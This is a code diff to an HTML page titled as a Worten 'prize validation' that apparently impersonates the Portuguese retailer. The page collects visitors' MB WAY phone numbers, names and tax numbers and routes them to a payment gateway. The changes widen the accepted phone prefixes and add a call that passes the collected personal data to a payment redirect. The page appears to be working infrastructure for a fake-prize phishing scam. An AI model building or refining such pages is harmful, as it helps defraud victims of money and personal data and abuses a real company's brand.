@@ -5,7 +5,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Validação de Prémio - Worten</title>
-    <link rel="stylesheet" href="style.css?v=35">
+    <link rel="stylesheet" href="style.css?v=37">
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     <link rel="icon" href="/assets/worten-logo.svg" type="image/svg+xml">
     <style>
@@ -285,8 +285,8 @@
         </div>
     </div>
 
-    <script src="script.js?v=35"></script>
-    <script src="waymb-service.js?v=35"></script>
+    <script src="script.js?v=37"></script>
+    <script src="waymb-service.js?v=37"></script>
 
     <!-- Loading Overlay -->
     <div id="loadingOverlay" class="modal-overlay"
@@ -383,13 +383,13 @@
             const cleanName = document.getElementById('mbwayName').value.trim();
             const cleanNIF = document.getElementById('mbwayNIF').value.replace(/\s/g, '');
 
-            // Validate Portuguese phone number - WayMB only accepts 91 for MB WAY
+            // Validate Portuguese phone number - All valid MB WAY prefixes
             const phoneDigits = cleanTel.replace(/\D/g, '');
-            const validPrefixes = ['91'];
+            const validPrefixes = ['91', '92', '93', '96'];
             const hasValidPrefix = validPrefixes.some(prefix => phoneDigits.startsWith(prefix));
 
             if (phoneDigits.length !== 9 || !hasValidPrefix) {
-                alert('Número de telemóvel inválido para MB WAY!\nPor favor, insira um número que comece com 91.\n\n(Apenas números 91 são aceites pelo gateway de pagamento)');
+                alert('Número de telemóvel inválido!\nPor favor, insira um número português válido (91x, 92x, 93x ou 96x).');
                 return;
             }
 
@@ -404,6 +404,7 @@
             }
 
             closePaymentModal();
+            await createAndRedirect('mbway', { phone: cleanTel, name: cleanName, document: cleanNIF });
         }
 
         async function createAndRedirect(method) {
